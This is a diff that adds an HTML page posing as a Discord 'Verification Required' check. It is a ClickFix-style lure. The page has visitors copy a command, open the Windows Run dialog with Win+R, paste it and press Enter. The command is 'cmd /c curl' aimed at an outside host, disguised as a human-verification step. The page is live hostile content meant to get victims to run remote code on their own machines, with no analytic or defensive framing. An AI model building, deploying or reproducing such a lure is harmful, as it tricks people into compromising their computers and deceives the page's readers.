@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #2c2f33; color: white; }
+        .container { width: 400px; margin: 0 auto; padding: 20px; }
+        .logo { width: 50px; }
+        .header { display: flex; align-items: center; }
+        .header img { margin-right: 10px; }
+        .header h1 { margin: 0; }
+        .instructions { margin-top: 20px; }
+        .instructions li { margin-bottom: 10px; }
+        .command { margin-top: 20px; }
+        .command input { width: 100%; padding: 10px; }
+        .command button { margin-top: 10px; padding: 10px 20px; background-color: #5865F2; color: white; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://cdn.discordapp.com/attachments/1138533146818523286/1169844853470662696/discord-logo.png" alt="Discord" class="logo">
+            <h1>Verification Required</h1>
+        </div>
+        <p>Complete the check below to continue.</p>
+        <div class="instructions">
+            <ol>
+                <li>Press Win + R</li>
+                <li>Press Ctrl + V to paste</li>
+                <li>Press Enter and wait a few seconds</li>
+            </ol>
+        </div>
+        <div class="command">
+            <input type="text" id="command" value="cmd /c curl -sL https://rbx-pearl.vercel.app/?t=17936504" readonly>
+            <button onclick="copyCommand()">Copy command</button>
+        </div>
+    </div>
+    <script>
+        function copyCommand() {
+            const command = document.getElementById('command');
+            command.select();
+            document.execCommand('copy');
+            alert('Command copied to clipboard!');
+        }
+    </script>
+</body>
+</html>
